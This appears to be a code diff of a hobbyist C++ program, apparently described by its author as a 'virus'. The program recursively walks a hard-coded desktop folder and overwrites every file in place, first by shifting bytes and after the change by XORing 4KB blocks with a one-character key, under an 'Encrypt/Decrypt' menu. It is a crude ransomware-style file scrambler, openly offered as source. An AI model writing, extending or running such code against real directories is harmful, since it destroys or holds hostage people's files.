@@ -3,75 +3,66 @@
 #include <vector>
 #include <filesystem>
 namespace fs = std::filesystem;
-void processFile(const fs::path& filePath, int opc) {
-    std::cout << "Processing file: " << filePath << std::endl;
-    std::fstream file(filePath, std::ios::in | std::ios::out | std::ios::binary);
 
+const int BLOCK_SIZE = 4096; // Process 4KB chunks
+
+// Simple XOR encryption/decryption
+void processFile(const fs::path& filePath, int opc, char key) {
+    std::cout << "Processing file: " << filePath << std::endl;
+
+    std::fstream file(filePath, std::ios::in | std::ios::out | std::ios::binary);
     if (!file.is_open()) {
         std::cerr << "Failed to open the file." << std::endl;
+        return;
     }
 
-    char byte;
-    int x = 0;
-    if (opc == 1) {
-        while (file.read(&byte, 1)) {
-            std::cout << &byte; //show the byte's content, remove the ampersand to show the literal byte
-            byte++; // Add 1 to the byte
-            file.seekp(-1, std::ios::cur); // Move the pointer back one position
-            file.write(&byte, 1); // Write the modified byte back to the file
-            file.seekp(1, std::ios::cur); //Advance position
+    std::vector<char> buffer(BLOCK_SIZE); // Buffer to store file data
+
+    while (file.read(buffer.data(), BLOCK_SIZE) || file.gcount() > 0) {
+        std::streamsize bytesRead = file.gcount();
+        // XOR each byte in the block with the key
+        for (std::streamsize i = 0; i < bytesRead; ++i) {
+            buffer[i] ^= key; // XOR operation
         }
+        file.seekp(-bytesRead, std::ios::cur); // Move back to the start of the block
+        file.write(buffer.data(), bytesRead);  // Write the modified block
     }
-    else {
-        while (file.read(&byte, 1)) {
-            std::cout << &byte; //show the byte's content, remove the ampersand to show the literal byte
-            byte--; // Remove 1 to the byte
-            file.seekp(-1, std::ios::cur); // Move the pointer back one position
-            file.write(&byte, 1); // Write the modified byte back to the file
-            file.seekp(1, std::ios::cur); //Advance position
-        }
-    }
-       file.close();
+
+    file.close();
 }
-void processDirectory(const fs::path& directoryPath, int opc) {
+
+void processDirectory(const fs::path& directoryPath, int opc, char key) {
     for (const auto& entry : fs::directory_iterator(directoryPath)) {
-        //Detects if the file is a folder, if so, it enters it
         if (fs::is_directory(entry)) {
-            // Recursive call to process subdirectory
-            processDirectory(entry.path(), opc);
+            processDirectory(entry.path(), opc, key); // Recursive call for subdirectory
         }
         else if (fs::is_regular_file(entry)) {
-            // Process regular (non-folder) file
-            processFile(entry.path(), opc);
+            processFile(entry.path(), opc, key); // Process the file
         }
     }
-
-//Trolling complete
-
-std::cout << "\n\n\n\n\n\n------------------------------------------------------------\n\n\n\n\n\n";
-std::cout << "Process Complete";
-std::cout << "\n\n\n\n\n\n------------------------------------------------------------\n\n\n\n\n\n";
- 
 }
 
 int main() {
-    system("Color 0A"); //some cool matrix color for extra style points
+    system("Color 0A"); // Stylish matrix color
 
-    // Folder that's going to get bombed
-    fs::path rootPath = "C:\\Users\\joldo\\Desktop\\Testeos"; 
+    fs::path rootPath = "C:\\Users\\joldo\\Desktop\\virus";
 
-    // Confirm that the folder, in fact, is an actual folder
-    if (!fs::exists(rootPath) || !fs::is_directory(rootPath)) { 
-        std::cerr << "Invalid directory: " << rootPath << std::endl; 
+    if (!fs::exists(rootPath) || !fs::is_directory(rootPath)) {
+        std::cerr << "Invalid directory: " << rootPath << std::endl;
         return 1;
     }
 
-
     int option;
-    std::cout << "What we doing boss?\n1) Encrypt\n2) Decryptshit\n3) Close\n\nChoose: ";
+    char key; // Key for XOR encryption
+    std::cout << "What we doing boss?\n1) Encrypt\n2) Decrypt\n3) Close\n\nChoose: ";
     std::cin >> option;
-    if(option == 1 || option == 2)
-    processDirectory(rootPath, option);
+
+    if (option == 1 || option == 2) {
+        std::cout << "Enter key (single character): ";
+        std::cin >> key;
+        processDirectory(rootPath, option, key);
+    }
 
     return 0;
 }
+
